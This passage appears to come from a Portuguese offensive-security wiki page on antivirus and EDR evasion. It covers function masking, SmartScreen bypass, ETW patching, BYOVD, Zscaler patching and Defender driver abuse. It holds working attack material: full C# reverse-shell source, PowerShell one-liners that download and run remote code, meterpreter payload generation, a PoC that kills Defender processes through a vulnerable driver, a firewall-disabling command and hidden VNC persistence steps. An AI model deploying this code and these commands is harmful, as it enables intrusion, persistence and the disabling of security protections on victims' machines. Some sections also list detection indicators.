Em vez de mascarar um implante inteiro apenas enquanto está inativo, um backend X86 do LLVM modificado pode manter funções selecionadas mascaradas com XOR sempre que estiverem inativas. A PoC Function Peekaboo seleciona nomes desmangulados que contêm `REG_`, injeta stubs de entrada/saída independentes de posição ao redor do código de máquina final e emite um handler de mascaramento compartilhado em `.text`; as assinaturas no nível do código-fonte e a convenção de chamada Windows x64 permanecem inalteradas.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformação do fluxo de controle no backend

Isso deve ocorrer após a seleção de instruções e a otimização, pois a transformação precisa abranger **todos os retornos emitidos** e conhecer o layout x86 exato. Um `MachineFunctionPass` pré-emissão encontra o último `MachineInstr::isReturn()`, exclui-o para que o caminho final continue até o epílogo anexado e substitui os retornos anteriores por `JMP_1 handler`. Mantenha qualquer desmontagem de pilha/frame gerada pelo compilador antes de cada retorno; redirecione apenas a própria instrução de retorno.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` e `emitFunctionBodyEnd()` emitem os stubs por função, enquanto `emitEndOfAsmFile()` emite o handler. Símbolos compartilhados entre os estágios de emissão permitem que um desvio no prólogo aponte para o epílogo emitido posteriormente; para emitir manualmente um `je` próximo, escreva `0F 84` seguido pela expressão MC de quatro bytes `target - address_after_je`. Em vez disso, chamadas e saltos para o handler podem ser emitidos como objetos `MCInst` (`CALL64pcrel32` e `JMP_1`). Um pass deve retornar `false` para uma função não selecionada se não tiver feito alterações; a PoC retorna incorretamente `true` nesse caso.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadados e inicialização pré-CRT

A PoC coloca uma chave XOR e registros de 16 bytes, que contêm um ponteiro de função realocado pelo loader e um tamanho em tempo de execução, em `.funcmeta`. Embora o campo C seja um `uint32_t`, o handler acessa um QWORD no deslocamento `+8` do registro, consumindo o tamanho e seu padding, e avança os registros em `0x10`. Os nomes das seções PE ocupam apenas oito bytes, portanto a consulta em tempo de execução encontra `.funcmet`. Um patcher externo adiciona um `.stub` executável, salva o RVA do ponto de entrada antigo no stub e redireciona `AddressOfEntryPoint`; o stub PIC obtém a base da imagem de `gs:[0x60]` → `[PEB+0x10]`, percorre as importações PE32+ para resolver um `VirtualProtect` já importado e é executado antes do CRT.<sup>[[38]](#references)[[39]](#references)</sup>

A inicialização define um sentinela em `gs:[0xE8]` e chama todas as funções dos metadados. O prólogo permanentemente legível registra o início da função em `gs:[0xF0]`, detecta o sentinela e ignora o corpo ainda não mascarado. Em seguida, o epílogo usa `call handler`; depois que o handler salva 13 registradores (`0x68` bytes), o endereço de retorno em `[rsp+0x68]` corresponde ao fim da função transformada, permitindo gravar `end - start` no registro de metadados. O stub limpa o sentinela e salta para `ImageBase + original_entry_point_RVA` depois que todos os corpos tiverem sido mascarados.<sup>[[38]](#references)[[39]](#references)</sup>

Durante uma chamada normal, o prólogo chama o mesmo handler simétrico para decodificar o corpo. O caminho final continua até o epílogo anexado, enquanto cada retorno anterior salta diretamente para o handler compartilhado. O epílogo normal também usa `jmp handler` em vez de `call`; assim, após remarcarar, o `ret` do handler consome o endereço de retorno do chamador original e preserva o resultado da função em `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva de mascaramento e indicadores de análise

O handler encontra o registro atual, ignora o prólogo visível de tamanho fixo (0x46 bytes nesta compilação), altera o restante para `PAGE_EXECUTE_READWRITE`, aplica XOR byte a byte usando o byte menos significativo da chave e, em seguida, define a proteção como `PAGE_EXECUTE_READ`. Portanto, o mesmo loop decodifica na entrada e codifica em cada saída normal.<sup>[[38]](#references)[[39]](#references)</sup>

Indicadores de alta confiança para esse projeto incluem:<sup>[[38]](#references)[[39]](#references)</sup>

- um ponto de entrada dentro de um `.stub` executável e uma seção `.funcmet` que contém uma chave e ponteiros realocados para `.text`;
- análise do PEB, da tabela de importações e da tabela de seções antes do CRT, seguida por chamadas através de cada ponteiro dos metadados;
- prólogos PIC idênticos de `call`/`pop` e muitos pontos de retorno redirecionados para um único handler;
- gravações em `gs:[0xE8]`, `gs:[0xF0]` e `gs:[0xF8]`, seguidas por transições repetidas de `VirtualProtect` e gravações de XOR byte a byte em páginas executáveis mapeadas pela imagem.

Isso é uma técnica para evitar scanners de memória, não uma proteção criptográfica: o arquivo com patch ainda contém o corpo original em texto claro, e um debugger pode interromper a execução em `VirtualProtect` ou no loop de XOR e despejar a função ativa. O XOR de byte único, os metadados legíveis e o limite fixo `0x46` também facilitam a recuperação offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Os slots TEB da PoC são locais à thread, mas as páginas de código modificadas são compartilhadas por todo o processo. Entradas simultâneas ou recursivas podem, portanto, alternar novamente as instruções enquanto outra invocação está em execução; exceções e saídas não locais também podem ignorar a remarcação. Uma implementação robusta deve sincronizar as transições, restaurar a proteção realmente retornada por `lpflOldProtect`, evitar comprimentos de stub codificados diretamente, auditar os caminhos de `call` e `jmp` quanto ao alinhamento da pilha x64 e chamar `FlushInstructionCache` após reescrever bytes executáveis. A Microsoft declara explicitamente que cabe ao chamador garantir a coerência do cache de instruções quando o código executável é modificado.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Talvez você já tenha visto esta tela ao baixar e executar alguns executáveis da internet.

O Microsoft Defender SmartScreen é um mecanismo de segurança criado para proteger o usuário final contra a execução de aplicativos potencialmente maliciosos.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

O SmartScreen funciona principalmente com base na reputação; isso significa que aplicativos baixados com pouca frequência acionam o SmartScreen, que alerta o usuário final e impede a execução do arquivo (embora ainda seja possível executá-lo clicando em Mais informações -> Executar mesmo assim).

**MoTW** (Mark of The Web) é um [Alternate Data Stream do NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) chamado Zone.Identifier, criado automaticamente ao baixar arquivos da internet, junto com a URL de origem do download.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verificando o ADS Zone.Identifier de um arquivo baixado da internet.</p></figcaption></figure>

> [!TIP]
> É importante observar que executáveis assinados com um certificado de assinatura **confiável** **não acionarão o SmartScreen**.

Uma maneira muito eficaz de impedir que seus payloads recebam o Mark of The Web é empacotá-los em algum tipo de contêiner, como um ISO. Isso ocorre porque o Mark-of-the-Web (MOTW) **não pode** ser aplicado a volumes **que não sejam NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em contêineres de saída para evitar o Mark-of-the-Web.

Exemplo de uso:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Aqui está uma demonstração de como contornar o SmartScreen empacotando payloads em arquivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) é um poderoso mecanismo de registro do Windows que permite que aplicativos e componentes do sistema **registrem eventos**. No entanto, produtos de segurança também podem usá-lo para monitorar e detectar atividades maliciosas.

Assim como é possível desabilitar (contornar) o AMSI, também é possível fazer com que a função **`EtwEventWrite`** do processo no espaço de usuário retorne imediatamente, sem registrar nenhum evento. Isso é feito corrigindo a função na memória para que retorne imediatamente, desabilitando efetivamente o registro de ETW para esse processo.

Você pode encontrar mais informações em **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Reflexão de Assembly C#

Carregar binários C# na memória já é uma técnica conhecida há bastante tempo e ainda é uma ótima maneira de executar suas ferramentas de post-exploitation sem ser detectado pelo AV.

Como o payload será carregado diretamente na memória, sem tocar no disco, só será necessário se preocupar em corrigir o AMSI para todo o processo.

A maioria dos frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc etc.) já permite executar assemblies C# diretamente na memória, mas há diferentes maneiras de fazer isso:

- **Fork\&Run**

Isso envolve **criar um novo processo sacrificial**, injetar seu código malicioso de post-exploitation nesse novo processo, executar o código malicioso e, ao terminar, encerrar o novo processo. Esse método tem vantagens e desvantagens. A vantagem do método fork and run é que a execução ocorre **fora** do processo do nosso Beacon implant. Isso significa que, se algo der errado ou for detectado durante a ação de post-exploitation, há uma **chance muito maior** de o nosso **implant sobreviver.** A desvantagem é que há uma **chance maior** de ser detectado por **Detecções Comportamentais**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Trata-se de injetar o código malicioso de post-exploitation **no próprio processo**. Assim, você evita criar um novo processo e submetê-lo à verificação do AV, mas a desvantagem é que, se algo der errado durante a execução do payload, há uma **chance muito maior** de **perder seu beacon**, pois ele pode falhar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se quiser saber mais sobre o carregamento de assemblies C#, confira este artigo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e o BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Você também pode carregar assemblies C# **a partir do PowerShell**; confira [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e [o vídeo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Usando Outras Linguagens de Programação

Como proposto em [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), é possível executar código malicioso usando outras linguagens, dando à máquina comprometida acesso **ao ambiente do interpretador instalado no compartilhamento SMB controlado pelo atacante**.

Ao permitir o acesso aos binários do interpretador e ao ambiente no compartilhamento SMB, você pode **executar código arbitrário nessas linguagens na memória** da máquina comprometida.

O repositório indica que o Defender ainda verifica os scripts, mas, usando Go, Java, PHP etc., temos **mais flexibilidade para contornar assinaturas estáticas**. Testes com scripts de reverse shell aleatórios e não ofuscados nessas linguagens foram bem-sucedidos.

## TokenStomping

Token stomping manipula o token de acesso de um produto de segurança, como um EDR ou AV. Reduzir os privilégios do token pode manter o processo em execução e, ao mesmo tempo, impedir que ele realize inspeções privilegiadas ou ações de remediação.

Para evitar isso, o Windows poderia **impedir que processos externos** obtenham handles dos tokens de processos de segurança.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Usando Software Confiável

### Chrome Remote Desktop

Conforme descrito [nesta publicação do blog](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), é fácil instalar o Chrome Remote Desktop no PC da vítima e usá-lo para assumir o controle e manter a persistência:<sup>[[35]](#references)</sup>
1. Baixe o programa em https://remotedesktop.google.com/, clique em "Set up via SSH" e, em seguida, clique no arquivo MSI para Windows para baixá-lo.
2. Execute silenciosamente o instalador na máquina da vítima (requer privilégios de administrador): `msiexec /i chromeremotedesktophost.msi /qn`
3. Volte à página do Chrome Remote Desktop e clique em Next. O assistente solicitará autorização; clique no botão Authorize para continuar.
4. Execute o comando fornecido, fazendo os ajustes necessários: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (o parâmetro `--pin` define o PIN sem usar a interface gráfica).
 

## Evasão Avançada

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

A evasão é um tópico muito complicado. Às vezes, é preciso levar em conta muitas fontes diferentes de telemetria em um único sistema, então é praticamente impossível permanecer totalmente indetectável em ambientes maduros.

Cada ambiente que você enfrentar terá seus próprios pontos fortes e fracos.

Recomendo muito assistir a esta palestra de [@ATTL4S](https://twitter.com/DaniLJ94) para ter uma introdução a técnicas mais avançadas de evasão.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta também é uma ótima palestra de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Técnicas Antigas**

### **Verificar quais partes o Defender considera maliciosas**

Você pode usar o [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), que **remove partes do binário** até **descobrir qual parte o Defender** considera maliciosa e a separa para você.\
Outra ferramenta que faz **a mesma coisa é** o [**avred**](https://github.com/dobin/avred), que oferece o serviço em um site aberto: [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Servidor Telnet**

Até o Windows10, todas as versões do Windows vinham com um **servidor Telnet** que podia ser instalado (como administrador) com o seguinte comando:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Faça-o **iniciar** quando o sistema for iniciado e **execute-o** agora:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Alterar a porta do telnet** (stealth) e desativar o firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Faça o download em: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads dos binários, não o instalador)

**NO HOST**: Execute _**winvnc.exe**_ e configure o servidor:

- Ative a opção _Disable TrayIcon_
- Defina uma senha em _VNC Password_
- Defina uma senha em _View-Only Password_

Em seguida, mova o binário _**winvnc.exe**_ e o arquivo recém-criado _**UltraVNC.ini**_ para dentro da **vítima**

#### **Conexão reversa**

O **atacante** deve **executar dentro do** próprio **host** o binário `vncviewer.exe -listen 5900` para que ele fique **preparado** para receber uma **conexão VNC** reversa. Depois, dentro da **vítima**: inicie o daemon winvnc com `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**AVISO:** Para manter a discrição, não faça algumas coisas:

- Não inicie o `winvnc` se ele já estiver em execução, ou você acionará um [popup](https://i.imgur.com/1SROTTl.png). Verifique se ele está em execução com `tasklist | findstr winvnc`
- Não inicie o `winvnc` sem o `UltraVNC.ini` no mesmo diretório, ou a [janela de configuração](https://i.imgur.com/rfMQWcf.png) será aberta
- Não execute `winvnc -h` para obter ajuda, ou você acionará um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Faça o download em: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Dentro do GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Agora **inicie o lister** com `msfconsole -r file.rc` e **execute** o **payload XML** com:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**O Defender atual encerrará o processo muito rapidamente.**

### Compilando nosso próprio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro C# Revershell

Compile-o com:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Use-o com:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# usando um compilador

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automáticos:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de obfuscators de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando Python para criar exemplos de injetores:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Mais

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Eliminando AV/EDR do espaço do kernel

Storm-2603 utilizou um pequeno utilitário de console conhecido como **Antivirus Terminator** para desativar as proteções de endpoint antes de implantar ransomware. A ferramenta traz seu **próprio driver vulnerável, mas *assinado***, e o explora para executar operações privilegiadas no kernel que nem mesmo os serviços AV Protected-Process-Light (PPL) conseguem bloquear.<sup>[[12]](#references)</sup>

Principais conclusões
1. **Driver assinado**: O arquivo gravado no disco é `ServiceMouse.sys`, mas o binário é o driver legitimamente assinado `AToolsKrnl64.sys`, do “System In-Depth Analysis Toolkit” da Antiy Labs. Como o driver tem uma assinatura válida da Microsoft, ele é carregado mesmo quando a Driver-Signature-Enforcement (DSE) está habilitada.
2. **Instalação do serviço**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   A primeira linha registra o driver como um **serviço do kernel** e a segunda o inicia, tornando `\\.\ServiceMouse` acessível a partir do espaço do usuário.
3. **IOCTLs expostos pelo driver**
   | Código IOCTL | Capacidade                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Encerrar um processo arbitrário pelo PID (usado para encerrar serviços do Defender/EDR) |
   | `0x990000D0` | Excluir um arquivo arbitrário do disco |
   | `0x990001D0` | Descarregar o driver e remover o serviço |

   Prova de conceito mínima em C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Por que funciona**: BYOVD ignora completamente as proteções em user-mode; o código executado no kernel pode abrir processos *protegidos*, encerrá-los ou adulterar objetos do kernel, independentemente de PPL/PP, ELAM ou outros recursos de hardening.

Detecção / Mitigação
•  Ative a lista de bloqueio de drivers vulneráveis da Microsoft (`HVCI`, `Smart App Control`) para que o Windows se recuse a carregar `AToolsKrnl64.sys`.
•  Monitore a criação de novos serviços do *kernel* e gere alertas quando um driver for carregado de um diretório com permissão de gravação para todos ou não estiver na allow-list.
•  Fique atento a handles de user-mode para objetos de dispositivo personalizados, seguidos de chamadas suspeitas a `DeviceIoControl`.

### Bypass das verificações de postura do Zscaler Client Connector por meio de patch de binários em disco

O **Client Connector** da Zscaler aplica regras de postura do dispositivo localmente e depende do RPC do Windows para comunicar os resultados a outros componentes. Duas escolhas de design frágeis tornam possível um bypass completo:

1. A avaliação da postura acontece **inteiramente no lado do cliente** (um booleano é enviado ao servidor).
2. Os endpoints internos de RPC apenas verificam se o executável que se conecta é **assinado pela Zscaler** (por meio de `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Ao **aplicar patch em quatro binários assinados no disco**, é possível neutralizar ambos os mecanismos:

| Binário | Lógica original alterada | Resultado |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Sempre retorna `1`, então todas as verificações são consideradas conformes |
| `ZSAService.exe` | Chamada indireta a `WinVerifyTrust` | Substituída por NOPs ⇒ qualquer processo (mesmo não assinado) pode se conectar aos pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Substituída por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Verificações de integridade do túnel | Ignoradas |

Trecho mínimo do patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Após substituir os arquivos originais e reiniciar a pilha de serviços:

* **Todas** as verificações de postura exibem **verde/conforme**.
* Binários não assinados ou modificados conseguem abrir os endpoints RPC de named pipe (por exemplo, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* O host comprometido obtém acesso irrestrito à rede interna definida pelas políticas do Zscaler.

Este estudo de caso demonstra como decisões de confiança puramente do lado do cliente e verificações simples de assinatura podem ser contornadas com alguns patches de bytes.

## Abuso de funcionalidade confiável do Microsoft Defender `BTR.sys`

O driver **Boot-Time Removal** do Defender é um contraexemplo útil ao BYOVD clássico. `BTR.sys` é um componente legítimo de remediação assinado pela Microsoft, sem bug de corrupção de memória e sem interface IOCTL; após obter acesso de administrador e `SeLoadDriverPrivilege`, um operador pode, em vez disso, forjar sua transação privada de remediação e obter as operações de arquivo/registro em Ring-0 previstas. Esta é uma **primitiva de neutralização de AV/EDR pós-comprometimento, não de acesso inicial nem de escalonamento de privilégios**, e o driver pode ser extraído do recurso `BOOTTIMETOOL` do próprio `MpEngine.dll` do alvo, em vez de importar um driver de terceiros que chame atenção.<sup>[[36]](#references)</sup>

### Preparação do driver de execução única

Normalmente, o Defender grava o recurso como um arquivo aleatório `[a-z]{8}.sys` e registra um serviço de kernel com nome semelhante. `DriverEntry` lê o valor `Args` do serviço, abre o ADS NTFS referenciado, descriptografa e valida a lista de ações, grava o feedback e retorna `0xC0000056` (`STATUS_DELETE_PENDING`) após a execução bem-sucedida, para que o driver seja descarregado em vez de permanecer residente. Um serviço forjado apresenta os seguintes valores característicos.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

O fluxo `:changelist` contém um blob criptografado com RC4. As builds analisadas reutilizam uma chave fixa de 256 bytes, portanto, a criptografia não é uma barreira de autorização. Um plaintext válido tem um cabeçalho global de 24 bytes (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC do cabeçalho e um ID de transação derivado do payload), seguido por um caminho de feedback UTF-16 terminado em NUL e qualquer número de itens. Cada item tem um cabeçalho de 16 bytes (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) mais dados específicos da ação, terminados em **exatamente quatro bytes NUL**. Cada região de cabeçalho/dados é verificada independentemente com CRC-32, polinômio `0xEDB88320`, estado inicial `0xFFFFFFFF` e **sem XOR final** (`~CRC32`); o estado do CRC é reiniciado para cada região.<sup>[[36]](#references)[[37]](#references)</sup>

Os IDs de ação aceitos expõem estas primitivas do kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dados do item | Resultado |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Exclui um arquivo, inclusive um arquivo bloqueado |
| 2 | `[UTF-16 path]` | Remove um diretório vazio |
| 3 | `[Flags][source][destination]` | Move um arquivo para um caminho protegido escolhido pelo atacante; um destino vazio significa excluir |
| 4 | `[Flags][key path]` | Exclui recursivamente uma chave do registro |
| 5 | `[Flags][key path + "\\" + value]` | Exclui um valor do registro |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Cria/atualiza um valor do registro e cria os caminhos de chave inexistentes |

